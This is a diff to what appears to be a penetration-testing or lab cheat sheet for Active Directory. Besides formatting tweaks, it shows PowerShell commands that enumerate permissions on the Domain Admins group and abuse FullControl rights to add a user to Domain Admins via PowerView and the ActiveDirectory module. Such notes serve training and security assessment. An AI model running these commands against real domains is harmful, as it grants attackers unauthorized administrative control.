@@ -473,7 +473,7 @@ timeoutMinutes 1 -showProgress -Verbose
 **_More Examples - :_**
 
 
-- Check the Domain Admins permission - PowerView as normal user:
+- Check the Domain Admins permission - `PowerView` as normal user:
 
 
 ```powershell
@@ -481,7 +481,7 @@ Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_
 ```
 
 
-- Using ActiveDirectory Module:
+- Using `ActiveDirectory Module`:
 
 ```powershell
 (Get-Acl -Path 'AD:\CN=Domain
@@ -490,7 +490,22 @@ cess | ?{$_.IdentityReference -match 'student1'}
 ```
 
 
-- Abusing FullControl using PowerView:
+- Abusing Full-control using `PowerView`:
+
+
 ```powershell
 Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
 ```
+
+
+
+- Using `ActiveDirectory Module`:
+
+
+
+```powershell
+Add-ADGroupMember -Identity 'Domain Admins' -Members testda
+```
+
+
+
